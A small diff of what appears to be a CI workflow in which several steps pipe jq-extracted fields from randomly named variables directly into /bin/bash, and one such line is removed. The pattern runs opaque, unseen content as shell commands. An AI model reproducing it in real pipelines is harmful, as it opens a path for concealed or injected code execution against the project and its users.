@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$voeat35" | jq -r .woj646 | /bin/bash
           echo $ab392 | jq -r .ov07548 | /bin/bash
           printf '%s' "$vwq3" | jq -r .zjoa71441 | /bin/bash
-          printf '%s' "$yj5382" | jq -r .utv18 | /bin/bash
 
       - name: Persist output
         if: always()
